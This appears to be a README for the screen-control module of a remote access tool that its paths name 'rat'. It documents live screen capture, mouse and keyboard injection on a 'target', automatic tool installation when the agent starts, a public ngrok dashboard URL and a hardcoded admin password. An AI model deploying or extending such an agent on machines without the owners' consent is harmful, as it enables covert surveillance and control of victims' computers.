# Remote Screen Control

Full TeamViewer-like remote desktop control with live screen feed and mouse/keyboard input.

## Features

### Live Screen Feed
- **~3 FPS** real-time screen capture
- **JPEG compression** for smooth streaming
- Automatic screen size detection
- Works with multiple monitors

### Mouse Control
- **Tap to click** - Tap anywhere on screen to left-click
- **Drag to move** - Drag your finger/mouse to move cursor
- **Right-click** - Right-click or use control button
- **Double-click** - Quick double-click action
- **Visual feedback** - Touch indicator shows click position

### Keyboard Control
- **Type text** - Enter text and send to remote system
- Supports special characters and spaces

### Fullscreen Mode
- **Click "Fullscreen"** button for immersive view
- Controls float on the side (desktop) or bottom (mobile)
- Perfect for mobile/tablet control

## Installation

### Quick Install (Automatic)
```bash
cd /home/dukeetheprogrammer/rat
./install.sh
```

The installer will attempt to install required tools automatically.

### Manual Tool Installation
If automatic install fails, run:
```bash
cd /home/dukeetheprogrammer/rat
chmod +x install_tools.sh
./install_tools.sh
```

Or install manually:

**Debian/Ubuntu:**
```bash
sudo apt-get install xdotool imagemagick
```

**RHEL/Fedora:**
```bash
sudo dnf install xdotool ImageMagick
```

**Arch:**
```bash
sudo pacman -S xdotool imagemagick
```

## Required Tools

| Tool | Purpose | Status |
|------|---------|--------|
| **xdotool** | Mouse movement, clicking, typing | Required |
| **ImageMagick** | Screen capture fallback | Optional |
| **mss** (Python) | Primary screen capture | Included |

## How to Use

### 1. Access Dashboard
```
https://unmade-backboned-agreeably.ngrok-free.dev
Login: admin / rat_admin_2024
```

### 2. Navigate to Remote Screen
Click "Remote Screen" in the sidebar.

### 3. Start Capture
Click **"Start Capture"** button.

### 4. Control the Screen

**Desktop:**
- **Click** on screen to left-click
- **Right-click** on screen to right-click
- **Drag** to move mouse
- Use control panel buttons for specific actions

**Mobile/Tablet:**
- **Tap** to click at that position
- **Drag** to move mouse around
- **Fullscreen** mode for better viewing

### 5. Type Text
1. Enter text in "Type Text" field
2. Click "Send" button
3. Text is typed on remote system

### 6. Fullscreen Mode
Click **"Fullscreen"** button for:
- Larger screen view
- Better mobile experience
- Immersive control

## Mobile Control

The remote screen is optimized for mobile:

1. **Tap anywhere** to click at that position
2. **Drag** to move mouse cursor
3. **Fullscreen** shows controls at bottom
4. Touch indicators show click positions

## Troubleshooting

### Screen is Black
- Ensure a display server is running
- On headless systems, start a display: `startx` or use Xvfb
- Check: `xdotool getmouselocation`

### Mouse Doesn't Move
- Install xdotool: `sudo apt-get install xdotool`
- Check: `which xdotool`
- Restart dashboard after installation

### Slow Screen Updates
- Reduce image quality in screen.py (change quality=85 to quality=60)
- Increase capture interval (change 0.3 to 0.5 or 1.0)

### Tools Not Installed
Run the install script:
```bash
cd /home/dukeetheprogrammer/rat
./install_tools.sh
```

## API Endpoints

### Get Screen Info
```bash
curl http://localhost:5000/api/screen/info
```

Returns:
```json
{
  "monitors": [...],
  "primary": {"width": 1920, "height": 1080},
  "tools": {
    "xdotool": true,
    "imagemagick": true
  },
  "system": "debian"
}
```

### WebSocket Events

**Client → Server:**
- `start_screen` - Start capturing
- `stop_screen` - Stop capturing
- `move_mouse` - Move mouse to (x, y)
- `click_mouse` - Click at position
- `type_text` - Type text

**Server → Client:**
- `screen_update` - New screen frame
- `mouse_position` - Current mouse position
- `screen_started` / `screen_stopped` - Status updates

## Configuration

Edit `/home/dukeetheprogrammer/rat/rat_agent/screen.py`:

```python
self.screenshot_interval = 0.3  # Seconds between frames (lower = smoother)
```

Recommended values:
- **0.2** - Very smooth (high bandwidth)
- **0.3** - Good balance (default)
- **0.5** - Moderate (medium bandwidth)
- **1.0** - Slow (low bandwidth)

## Performance Tips

1. **Use fullscreen** on mobile for better experience
2. **Close other tabs** to free bandwidth
3. **Use WiFi** instead of cellular for smoother feed
4. **Reduce quality** if connection is slow

## Status Indicators

| Status | Color | Meaning |
|--------|-------|---------|
| Connected | Green | WebSocket connected, ready |
| Starting... | Gray | Initializing capture |
| Disconnected | Red | Connection lost |
| Stopped | Gray | Capture stopped |

## Auto-Install on Target

The screen module auto-detects system type and installs tools:

```python
def _auto_install_tools(self):
    # Detects: debian, redhat, arch, suse
    # Installs: xdotool, imagemagick
```

This runs when the agent starts.
